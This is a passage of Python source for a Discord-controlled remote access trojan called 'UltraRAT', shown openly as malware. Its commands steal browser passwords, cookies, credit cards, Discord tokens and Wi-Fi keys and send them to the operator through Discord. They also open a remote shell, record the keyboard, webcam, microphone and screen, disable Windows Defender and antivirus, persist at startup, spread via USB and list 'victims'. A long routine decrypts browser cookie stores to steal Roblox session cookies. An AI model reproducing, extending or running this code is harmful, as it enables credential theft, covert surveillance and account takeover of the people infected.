        history = await run_blocking(fetch_browser_history)()
        autofill = await run_blocking(fetch_browser_autofill)()
        cards = await run_blocking(fetch_browser_cards)()
        tokens = await run_blocking(find_discord_tokens)()
        wifi = await run_blocking(get_wifi_passwords)()
        sysinfo = await run_blocking(get_system_info)()
        desktop_files = await run_blocking(get_desktop_files)()
        desktop_files = desktop_files[:10] if desktop_files else []
        data = {
            "passwords": format_passwords(passwords),
            "cookies": format_cookies(cookies),
            "history": format_history(history),
            "autofill": format_autofill(autofill),
            "cards": format_cards(cards),
            "discord_tokens": format_tokens(tokens),
            "wifi": format_wifi(wifi),
            "system_info": format_sysinfo(sysinfo),
        }
        zip_path = await run_blocking(zip_data)(data, desktop_files)
        await ctx.author.send("Here is the info:", file=discord.File(zip_path))
    except Exception as e:
        await ctx.send(f"Failed to send file: {e}")
    finally:
        try:
            if 'zip_path' in locals() and os.path.exists(zip_path):
                os.remove(zip_path)
        except Exception:
            pass

@bot.command()
@owner_only()
async def shell(ctx, *, command: str):
    try:
        result = await run_blocking(subprocess.check_output)(command, shell=True, stderr=subprocess.STDOUT, timeout=120)
        output = result.decode(errors="ignore")
        if len(output) > 1900:
            with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8", suffix=".txt") as f:
                f.write(output)
                fname = f.name
            await ctx.author.send("Output too long, see attached file.", file=discord.File(fname))
            os.remove(fname)
        else:
            await ctx.send(f"```\n{output}\n```")
    except subprocess.TimeoutExpired:
        await ctx.send("Command timed out.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@owner_only()
async def screenshot(ctx):
    if ImageGrab is None and pyautogui is None:
        await ctx.send("No screenshot module available.")
        return
    try:
        tmp = tempfile.mktemp(suffix=".png")
        if ImageGrab:
            img = await run_blocking(ImageGrab.grab)()
            img.save(tmp)
        elif pyautogui:
            img = await run_blocking(pyautogui.screenshot)()
            img.save(tmp)
        await ctx.author.send("Screenshot:", file=discord.File(tmp))
        os.remove(tmp)
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@owner_only()
async def webcam(ctx):
    try:
        tmp = await run_blocking(take_webcam_snapshot)()
        if tmp:
            await ctx.author.send("Webcam snapshot:", file=discord.File(tmp))
            os.remove(tmp)
        else:
            await ctx.send("Could not take webcam snapshot (no webcam or OpenCV not installed).")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@owner_only()
async def mic(ctx, duration: int = 10):
    if sd is None or np is None or scipy is None:
        await ctx.send("sounddevice/numpy/scipy not installed.")
        return
    await ctx.send(f"Recording microphone for {duration} seconds...")
    tmp = await run_blocking(record_microphone)(duration)
    if tmp:
        await ctx.author.send("Microphone recording:", file=discord.File(tmp))
        os.remove(tmp)
    else:
        await ctx.send("Failed to record microphone.")

@bot.command()
@owner_only()
async def download(ctx, *, filepath: str):
    if not os.path.exists(filepath):
        await ctx.send("File not found.")
        return
    try:
        await ctx.author.send("Here is the file:", file=discord.File(filepath))
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@owner_only()
async def upload(ctx):
    if not ctx.message.attachments:
        await ctx.send("Attach a file to upload.")
        return
    for attachment in ctx.message.attachments:
        save_path = os.path.join(os.path.expanduser("~"), "Desktop", attachment.filename)
        try:
            await attachment.save(save_path)
            await ctx.send(f"Saved to {save_path}")
        except Exception as e:
            await ctx.send(f"Failed to save file: {e}")

@bot.command()
@owner_only()
async def message(ctx, *, text: str):
    if ctypes is None:
        await ctx.send("ctypes not available.")
        return
    try:
        await run_blocking(lambda: ctypes.windll.user32.MessageBoxW(0, text, "Message from Admin", 0x40))()
        await ctx.send("Message box shown.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@owner_only()
async def processes(ctx):
    out = await run_blocking(list_processes)()
    if len(out) > 1900:
        with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8", suffix=".txt") as f:
            f.write(out)
            fname = f.name
        await ctx.author.send("Process list attached.", file=discord.File(fname))
        os.remove(fname)
    else:
        await ctx.send(f"```\n{out}\n```")

@bot.command()
@owner_only()
async def kill(ctx, pid: int):
    result = await run_blocking(kill_process)(pid)
    await ctx.send(result)

@bot.command()
@owner_only()
async def ls(ctx, *, dirpath: str = None):
    if not dirpath:
        dirpath = os.path.expanduser("~")
    out = await run_blocking(list_dir)(dirpath)
    if len(out) > 1900:
        with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8", suffix=".txt") as f:
            f.write(out)
            fname = f.name
        await ctx.author.send("Directory listing attached.", file=discord.File(fname))
        os.remove(fname)
    else:
        await ctx.send(f"```\n{out}\n```")

@bot.command()
@owner_only()
async def clipboard(ctx):
    data = await run_blocking(get_clipboard)()
    await ctx.send(f"Clipboard: {data}")

@bot.command()
@owner_only()
async def setclipboard(ctx, *, text: str):
    ok = await run_blocking(set_clipboard)(text)
    if ok:
        await ctx.send("Clipboard set.")
    else:
        await ctx.send("Failed to set clipboard.")

@bot.command()
@owner_only()
async def lock(ctx):
    result = await run_blocking(lock_workstation)()
    await ctx.send(result)

@bot.command()
@owner_only()
async def shutdown(ctx):
    await ctx.send("Shutting down...")
    await run_blocking(shutdown_pc)()

@bot.command()
@owner_only()
async def restart(ctx):
    await ctx.send("Restarting...")
    await run_blocking(restart_pc)()

@bot.command()
@owner_only()
async def sysinfo(ctx):
    info = await run_blocking(get_system_info)()
    out = format_sysinfo(info)
    if len(out) > 1900:
        with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8", suffix=".txt") as f:
            f.write(out)
            fname = f.name
        await ctx.author.send("System info attached.", file=discord.File(fname))
        os.remove(fname)
    else:
        await ctx.send(f"```\n{out}\n```")

@bot.command()
@owner_only()
async def keylogger(ctx, action: str = "start"):
    logpath = keylogger_logpath
    if action == "start":
        if pynput is None:
            await ctx.send("pynput not installed.")
            return
        ok = await run_blocking(start_keylogger)(logpath)
        await ctx.send("Keylogger started." if ok else "Failed to start keylogger.")
    elif action == "dump":
        if os.path.exists(logpath):
            # Show a summary/overview in an embed, and attach the full file
            overview = get_keylog_overview(logpath, maxlen=1000)
            import discord
            embed = discord.Embed(
                title="Keylogger Dump Overview",
                description=overview if overview else "No recent keystrokes.",
                color=0x3498db
            )
            embed.set_footer(text="Full keylog attached as file.")
            await ctx.author.send(embed=embed)
            await ctx.author.send("Keylog dump:", file=discord.File(logpath))
        else:
            await ctx.send("No keylog found.")
    elif action == "stop":
        ok = await run_blocking(stop_keylogger)()
        await ctx.send("Keylogger stopped." if ok else "Keylogger was not running.")
    elif action == "live":
        # Live keylogger: show the last 1000 keystrokes as a single line, and update every 2 seconds for 20 seconds
        if pynput is None:
            await ctx.send("pynput not installed.")
            return
        await ctx.send("Starting live keylogger stream (20s, updates every 2s)...")
        for i in range(10):
            live = get_keylog_live(1000)
            if not live:
                live = "[No keystrokes yet]"
            # Discord doesn't like empty messages, so always send something
            await ctx.send(f"**Live Keylog [{i+1}/10]:**\n`{live[-1900:]}`")
            await asyncio.sleep(2)
        await ctx.send("Live keylogger session ended.")

@bot.command()
@owner_only()
async def startup(ctx, action: str = "add"):
    if action == "add":
        ok = await run_blocking(add_to_startup)()
        await ctx.send("Added to startup." if ok else "Failed to add to startup.")
    elif action == "remove":
        ok = await run_blocking(remove_from_startup)()
        await ctx.send("Removed from startup." if ok else "Failed to remove from startup.")

@bot.command()
@owner_only()
async def defender(ctx, action: str = "disable"):
    if action == "disable":
        ok = await run_blocking(disable_defender)()
        await ctx.send("Defender disabled." if ok else "Failed to disable Defender.")

@bot.command()
@owner_only()
async def avkill(ctx):
    found = await run_blocking(uninstall_av)()
    if found:
        await ctx.send(f"Attempted to kill: {', '.join(found)}")
    else:
        await ctx.send("No AV processes found.")

@bot.command()
@owner_only()
async def usbspread(ctx):
    await run_blocking(spread_usb)()
    await ctx.send("Attempted USB spread.")

@bot.command()
@owner_only()
async def selfdelete(ctx):
    await ctx.send("Self-deleting...")
    await run_blocking(self_delete)()

@bot.command()
@owner_only()
async def execpy(ctx, *, code: str):
    try:
        exec_globals = {}
        exec(code, exec_globals)
        await ctx.send("Executed Python code.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@owner_only()
async def execps(ctx, *, code: str):
    try:
        result = await run_blocking(subprocess.check_output)(["powershell", "-Command", code], stderr=subprocess.STDOUT)
        output = result.decode(errors="ignore")
        if len(output) > 1900:
            with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8", suffix=".txt") as f:
                f.write(output)
                fname = f.name
            await ctx.author.send("Output too long, see attached file.", file=discord.File(fname))
            os.remove(fname)
        else:
            await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@owner_only()
async def execbat(ctx, *, code: str):
    try:
        tmp = tempfile.mktemp(suffix=".bat")
        with open(tmp, "w") as f:
            f.write(code)
        result = await run_blocking(subprocess.check_output)(tmp, shell=True, stderr=subprocess.STDOUT)
        output = result.decode(errors="ignore")
        if len(output) > 1900:
            with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8", suffix=".txt") as f2:
                f2.write(output)
                fname = f2.name
            await ctx.author.send("Output too long, see attached file.", file=discord.File(fname))
            os.remove(fname)
        else:
            await ctx.send(f"```\n{output}\n```")
        os.remove(tmp)
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ========== NEW COMMANDS ==========

@bot.command()
@owner_only()
async def changewallpaper(ctx):
    if not ctx.message.attachments:
        await ctx.send("Attach an image to set as wallpaper.")
        return
    attachment = ctx.message.attachments[0]
    tmp = tempfile.mktemp(suffix=os.path.splitext(attachment.filename)[-1])
    try:
        await attachment.save(tmp)
        ok, msg = await run_blocking(change_wallpaper)(tmp)
        await ctx.send(msg)
        os.remove(tmp)
    except Exception as e:
        await ctx.send(f"Failed to change wallpaper: {e}")

@bot.command()
@owner_only()
async def freezemouse(ctx):
    ok, msg = await run_blocking(freeze_mouse)()
    await ctx.send(msg)

@bot.command()
@owner_only()
async def unfreezemouse(ctx):
    ok, msg = await run_blocking(unfreeze_mouse)()
    await ctx.send(msg)

@bot.command()
@owner_only()
async def victimviewer(ctx):
    victims = await run_blocking(get_victims)()
    if not victims:
        await ctx.send("No victims registered.")
        return
    out = "**Victims:**\n"
    for v in victims:
        out += f"Host: {v['hostname']} | User: {v['user']} | IP: {v['ip']}\n"
    await ctx.send(out if len(out) < 1900 else "Too many victims to display.")

# ========== ROBLOX COOKIE STEALER ==========

import requests

def get_roblox_username(cookie):
    """
    Given a .ROBLOSECURITY cookie, return the Roblox username and userId.
    Returns (username, userId) or (None, None) if invalid.
    """
    try:
        r = requests.get(
            "https://users.roblox.com/v1/users/authenticated",
            cookies={".ROBLOSECURITY": cookie},
            timeout=10,
        )
        if r.status_code == 200:
            data = r.json()
            return data.get("name"), data.get("id")
    except Exception:
        pass
    return None, None

def get_chrome_masterkey(local_state_path):
    # Helper to get Chrome's master key for cookie decryption
    import base64, json
    from Cryptodome.Cipher import AES
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    if sys.platform == "win32":
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        import win32crypt
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    else:
        return None

def get_roblox_cookie():
    """
    Extracts the Roblox .ROBLOSECURITY cookie from every browser profile's storage,
    including locked databases (by using process memory dump if needed).
    Returns a list of found cookies with browser and profile info, and Roblox username if valid.
    """
    results = []
    import psutil

    # --- EXTENDED BROWSER SEARCH ---
    chromium_browsers = {
        "Chrome": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Google", "Chrome", "User Data"),
            os.path.join(os.environ.get('PROGRAMFILES', ''), "Google", "Chrome", "User Data"),
            os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Google", "Chrome", "User Data"),
        ],
        "Edge": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Microsoft", "Edge", "User Data"),
        ],
        "Brave": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "BraveSoftware", "Brave-Browser", "User Data"),
        ],
        "Opera": [
            os.path.join(os.environ.get('APPDATA', ''), "Opera Software", "Opera Stable"),
            os.path.join(os.environ.get('APPDATA', ''), "Opera Software", "Opera GX Stable"),
        ],
        "Vivaldi": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Vivaldi", "User Data"),
        ],
        "Yandex": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Yandex", "YandexBrowser", "User Data"),
        ],
        "Chromium": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Chromium", "User Data"),
        ],
        "CocCoc": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "CocCoc", "Browser", "User Data"),
        ],
        "Iridium": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Iridium", "User Data"),
        ],
        "Torch": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Torch", "User Data"),
        ],
        "Comodo Dragon": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Comodo", "Dragon", "User Data"),
        ],
        "360Browser": [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "360Browser", "Browser", "User Data"),
        ],
    }

    # Try all possible user profiles for each browser
    for browser, user_data_paths in chromium_browsers.items():
        for user_data in user_data_paths:
            if not os.path.exists(user_data):
                continue
            local_state_path = os.path.join(user_data, "Local State")
            master_key = None
            if os.path.exists(local_state_path):
                try:
                    master_key = get_chrome_masterkey(local_state_path)
                except Exception:
                    master_key = None
            profiles = []
            try:
                for d in os.listdir(user_data):
                    if d.startswith("Default") or d.startswith("Profile") or d.lower().startswith("guest") or d.lower().startswith("user"):
                        profiles.append(os.path.join(user_data, d))
                if os.path.exists(os.path.join(user_data, "Cookies")):
                    profiles.append(user_data)
            except Exception:
                continue
            for profile in profiles:
                cookie_db = os.path.join(profile, "Cookies")
                if not os.path.exists(cookie_db):
                    continue
                tmp_db = tempfile.mktemp()
                copied = False
                # Try to copy the file, if locked, use process memory dump
                try:
                    shutil.copy2(cookie_db, tmp_db)
                    copied = True
                except Exception:
                    # Try to use process handle to dump the file if locked
                    for proc in psutil.process_iter(['name', 'exe']):
                        try:
                            if proc.info['name'] and any(b in proc.info['name'].lower() for b in [browser.lower()]):
                                # Try to read file from process memory (Windows only)
                                if sys.platform == "win32":
                                    import ctypes
                                    import mmap
                                    import win32con
                                    import win32file
                                    import win32api
                                    import win32process
                                    import win32event
                                    import win32security
                                    # Try to open the file with sharing
                                    try:
                                        handle = win32file.CreateFile(
                                            cookie_db,
                                            win32con.GENERIC_READ,
                                            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
                                            None,
                                            win32con.OPEN_EXISTING,
                                            0,
                                            None
                                        )
                                        with open(tmp_db, "wb") as out:
                                            while True:
                                                data = win32file.ReadFile(handle, 4096)[1]
                                                if not data:
                                                    break
                                                out.write(data)
                                        win32file.CloseHandle(handle)
                                        copied = True
                                        break
                                    except Exception:
                                        continue
                        except Exception:
                            continue
                if not copied:
                    continue
                try:
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()
                    queries = [
                        "SELECT host_key, name, encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'",
                        "SELECT host_key, name, value FROM cookies WHERE name='.ROBLOSECURITY'",
                        "SELECT host, name, encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'",
                        "SELECT host, name, value FROM cookies WHERE name='.ROBLOSECURITY'",
                    ]
                    found = False
                    for q in queries:
                        try:
                            cursor.execute(q)
                            rows = cursor.fetchall()
                            if rows:
                                for row in rows:
                                    host, name, enc_value = row
                                    value = ""
                                    try:
                                        if sys.platform == "win32":
                                            if master_key and isinstance(enc_value, bytes) and (enc_value[:3] == b'v10' or enc_value[:3] == b'v11'):
                                                iv = enc_value[3:15]
                                                payload = enc_value[15:]
                                                from Cryptodome.Cipher import AES
                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                                decrypted = cipher.decrypt(payload)[:-16]
                                                value = decrypted.decode('utf-8', errors='ignore')
                                            elif isinstance(enc_value, bytes):
                                                import win32crypt
                                                value = win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                                            elif isinstance(enc_value, str):
                                                value = enc_value
                                        else:
                                            if isinstance(enc_value, str):
                                                value = enc_value
                                            else:
                                                value = ""
                                    except Exception:
                                        value = ""
                                    if value:
                                        username, userid = get_roblox_username(value)
                                        results.append({
                                            "browser": browser,
                                            "profile": os.path.basename(profile),
                                            "host": host,
                                            "cookie": value,
                                            "username": username,
                                            "userid": userid
                                        })
                                        found = True
                                if found:
                                    break
                        except Exception:
                            continue
                    conn.close()
                except Exception:
                    pass
                try:
                    os.remove(tmp_db)
                except Exception:
                    pass

    # Try to get from Firefox and derivatives (Waterfox, LibreWolf, etc)
    try:
        firefox_base_dirs = [
            os.path.join(os.environ.get('APPDATA', ''), "Mozilla", "Firefox", "Profiles"),
            os.path.join(os.environ.get('APPDATA', ''), "Waterfox", "Profiles"),
            os.path.join(os.environ.get('APPDATA', ''), "LibreWolf", "Profiles"),
        ]
        for firefox_dir in firefox_base_dirs:
            if os.path.exists(firefox_dir):
                for profile in os.listdir(firefox_dir):
                    profile_path = os.path.join(firefox_dir, profile)
                    cookies_sqlite = os.path.join(profile_path, "cookies.sqlite")
                    if os.path.exists(cookies_sqlite):
                        try:
                            tmp_db = tempfile.mktemp()
                            shutil.copy2(cookies_sqlite, tmp_db)
                            conn = sqlite3.connect(tmp_db)
                            cursor = conn.cursor()
                            queries = [
                                "SELECT host, name, value FROM moz_cookies WHERE name='.ROBLOSECURITY'",
                                "SELECT host, name, value FROM cookies WHERE name='.ROBLOSECURITY'",
                            ]
                            for q in queries:
                                try:
                                    cursor.execute(q)
                                    for row in cursor.fetchall():
                                        host, name, value = row
                                        if value:
                                            username, userid = get_roblox_username(value)
                                            results.append({
                                                "browser": "Firefox",
                                                "profile": profile,
                                                "host": host,
                                                "cookie": value,
                                                "username": username,
                                                "userid": userid
                                            })
                                except Exception:
                                    continue
                            conn.close()
                            os.remove(tmp_db)
                        except Exception:
                            continue
    except Exception:
        pass

    # Try to get from Internet Explorer/Edge Legacy (Windows Cookie Store)
    try:
        import glob
        cookies_path = os.path.join(os.environ.get('APPDATA', ''), r"Microsoft\Windows\Cookies")
        if os.path.exists(cookies_path):
            for cookiefile in glob.glob(os.path.join(cookies_path, "*")):
                try:
                    with open(cookiefile, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        if ".ROBLOSECURITY" in content:
                            # Try to extract the cookie value
                            matches = re.findall(r"\.ROBLOSECURITY\s*=\s*([A-Za-z0-9_%\-]{30,})", content)
                            for value in matches:
                                username, userid = get_roblox_username(value)
                                results.append({
                                    "browser": "IE/EdgeLegacy",
                                    "profile": "default",
                                    "host": "unknown",
                                    "cookie": value,
                                    "username": username,
                                    "userid": userid
                                })
                except Exception:
                    continue
    except Exception:
        pass

    # Try to get from LevelDB (Chromium/Brave/Edge/Opera/Discord, etc) for session cookies
    try:
        for browser, user_data_paths in chromium_browsers.items():
            for user_data in user_data_paths:
                if not os.path.exists(user_data):
                    continue
                profiles = []
                try:
                    for d in os.listdir(user_data):
                        if d.startswith("Default") or d.startswith("Profile") or d.lower().startswith("guest") or d.lower().startswith("user"):
                            profiles.append(os.path.join(user_data, d))
                    if os.path.exists(os.path.join(user_data, "Local Storage", "leveldb")):
                        profiles.append(user_data)
                except Exception:
                    continue
                for profile in profiles:
                    leveldb_path = os.path.join(profile, "Local Storage", "leveldb")
                    if not os.path.exists(leveldb_path):
                        continue
                    for filename in os.listdir(leveldb_path):
                        if not filename.endswith(".log") and not filename.endswith(".ldb"):
                            continue
                        try:
                            with open(os.path.join(leveldb_path, filename), "rb") as f:
                                content = f.read()
                                for match in re.findall(rb"\.ROBLOSECURITY(?:'|\"|=|%22|%27)?[,:= ]+([A-Za-z0-9_%\-]{30,})", content):
                                    value = match.decode(errors="ignore")
                                    if value and not any(value in r['cookie'] for r in results):
                                        username, userid = get_roblox_username(value)
                                        results.append({
                                            "browser": browser + "-LevelDB",
                                            "profile": os.path.basename(profile),
                                            "host": "unknown",
                                            "cookie": value,
                                            "username": username,
                                            "userid": userid
                                        })
                        except Exception:
                            continue
    except Exception:
        pass

    # Try to get from Windows Credential Manager (rare, but possible)
    try:
        import subprocess
        output = subprocess.check_output('cmdkey /list', shell=True, encoding='utf-8', errors='ignore')
        if ".ROBLOSECURITY" in output:
            matches = re.findall(r"\.ROBLOSECURITY\s*=\s*([A-Za-z0-9_%\-]{30,})", output)
            for value in matches:
                username, userid = get_roblox_username(value)
                results.append({
                    "browser": "WinCredMan",
                    "profile": "default",
                    "host": "unknown",
                    "cookie": value,
                    "username": username,
                    "userid": userid
                })
    except Exception:
        pass

    # Try to get from environment variables (if user/script set it)
    try:
        for k, v in os.environ.items():
            if ".ROBLOSECURITY" in v:
                matches = re.findall(r"\.ROBLOSECURITY\s*=\s*([A-Za-z0-9_%\-]{30,})", v)
                for value in matches:
                    username, userid = get_roblox_username(value)
                    results.append({
                        "browser": "ENV",
                        "profile": "default",
                        "host": k,
                        "cookie": value,
                        "username": username,
                        "userid": userid
                    })
    except Exception:
        pass

    # Try to get from Discord local storage (if Roblox cookie was pasted in chat)
    try:
        discord_paths = [
            os.path.join(os.environ.get('APPDATA', ''), "discord"),
            os.path.join(os.environ.get('APPDATA', ''), "discordcanary"),
            os.path.join(os.environ.get('APPDATA', ''), "discordptb"),
        ]
        for dpath in discord_paths:
            leveldb = os.path.join(dpath, "Local Storage", "leveldb")
            if os.path.exists(leveldb):
                for filename in os.listdir(leveldb):
                    if not filename.endswith(".log") and not filename.endswith(".ldb"):
                        continue
                    try:
                        with open(os.path.join(leveldb, filename), "rb") as f:
                            content = f.read()
                            for match in re.findall(rb"\.ROBLOSECURITY(?:'|\"|=|%22|%27)?[,:= ]+([A-Za-z0-9_%\-]{30,})", content):
                                value = match.decode(errors="ignore")
                                if value and not any(value in r['cookie'] for r in results):
                                    username, userid = get_roblox_username(value)
                                    results.append({
                                        "browser": "Discord-LevelDB",
                                        "profile": os.path.basename(dpath),
                                        "host": "unknown",
                                        "cookie": value,
                                        "username": username,
                                        "userid": userid
                                    })
                    except Exception:
                        continue
    except Exception:
        pass

    # Remove duplicates (by cookie value)
    unique = []
    seen = set()
    for r in results:
        if r["cookie"] and r["cookie"] not in seen:
            seen.add(r["cookie"])
            unique.append(r)
    return unique

@bot.command()
@owner_only()
async def robloxcookie(ctx):
    await ctx.send("Searching for Roblox .ROBLOSECURITY cookie in every browser profile's storage (and verifying with Roblox API for username)...")
    cookies = await run_blocking(get_roblox_cookie)()
    if not cookies:
        await ctx.send("No Roblox cookie found.")
        return
    out = ""
    for entry in cookies:
        userinfo = ""
        if entry.get("username"):
            userinfo = f"Username: {entry['username']} (UserID: {entry['userid']})"
        else:
            userinfo = "Username: INVALID or expired cookie"
        out += (
            f"[{entry['browser']}/{entry['profile']}]\n"
            f"Host: {entry['host']}\n"
            f"{userinfo}\n"
            f".ROBLOSECURITY: {entry['cookie']}\n\n"
        )
    if len(out) > 1900:
        with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8", suffix=".txt") as f:
            f.write(out)
            fname = f.name
        await ctx.author.send("Roblox cookie(s) attached.", file=discord.File(fname))
        os.remove(fname)
    else:
        await ctx.author.send(f"Roblox cookie(s):\n{out}")

# ========== LIVE VIEWER FEATURE ==========

@bot.command()
@owner_only()
async def liveviewer(ctx):
    """
    Streams the desktop live for 30 seconds by sending screenshots every second.
    """
    if ImageGrab is None:
        await ctx.send("PIL.ImageGrab is not available on this system.")
        return
    await ctx.send("Starting live screen viewer for 30 seconds...")
    try:
        for i in range(30):
            # Grab screenshot
            img = ImageGrab.grab()
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmpfile:
                img.save(tmpfile, format="PNG")
                fname = tmpfile.name
            # Send as a file (ephemeral to author)
            await ctx.author.send(file=discord.File(fname), content=f"Live screen {i+1}/30")
            os.remove(fname)
            await asyncio.sleep(1)
        await ctx.author.send("Live viewer session ended.")
    except Exception as e:
        await ctx.send(f"Live viewer error: {e}")

from discord.ext.commands import DefaultHelpCommand

class OwnerHelpCommand(DefaultHelpCommand):
    async def send_bot_help(self, mapping):
        ctx = self.context
        if ctx.author.id != OWNER_ID:
            await ctx.send("Unauthorized.")
            return
        help_text = """
**UltraRAT Commands:**
!steal - Steal all info (passwords, cookies, history, autofill, cards, tokens, wifi, sysinfo, desktop files)
!shell <cmd> - Run shell command
!screenshot - Screenshot desktop
!webcam - Take webcam snapshot
!mic [seconds] - Record microphone
!download <filepath> - Download file
!upload - Upload file (attach file)
!message <text> - Show message box
!processes - List running processes
!kill <pid> - Kill process by PID
!ls <dir> - List files in directory
!clipboard - Get clipboard contents
!setclipboard <text> - Set clipboard contents
!lock - Lock workstation
!shutdown - Shutdown computer
!restart - Restart computer
!sysinfo - Get detailed system info
!keylogger [start|dump|stop] - Keylogger
!startup [add|remove] - Add/remove from startup
!defender [disable] - Disable Windows Defender
!avkill - Kill AV processes
!usbspread - Spread via USB
!selfdelete - Self-delete
!execpy <python> - Run Python code
!execps <powershell> - Run PowerShell code
!execbat <batch> - Run batch script
!changewallpaper - Change desktop wallpaper (attach image)
!freezemouse - Freeze mouse movement
!unfreezemouse - Unfreeze mouse movement
!victimviewer - Show all registered victims
!robloxcookie - Steal Roblox .ROBLOSECURITY cookie
!liveviewer - Live view the screen for 30 seconds
!help - Show this help

Roblox Cookie Info:
You can find your Roblox cookie by opening the Developer Tools in your browser (usually pressing F12), then going to the 'Application' tab, and scrolling to 'Cookies' under 'Storage'. Look for the '.ROBLOSECURITY' cookie. 
Make sure you get it from storage in inspect elements on every browser you use. Do this to find the Roblox cookie.
"""
        await ctx.author.send(help_text)

bot.help_command = OwnerHelpCommand()

# ========== BOT RUN ==========
if __name__ == "__main__":
    print("Starting UltraRAT...")
    print(f"DISCORD_BOT_TOKEN: {DISCORD_BOT_TOKEN[:10]}... (hidden)")
    print(f"OWNER_ID: {OWNER_ID}")
    if DISCORD_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not DISCORD_BOT_TOKEN:
        print("ERROR: You must set your DISCORD_BOT_TOKEN at the top of the script or as an environment variable.")
        sys.exit(1)
    try:
        bot.run(DISCORD_BOT_TOKEN)
    except Exception as e:
        print(f"Failed to start bot: {e}")
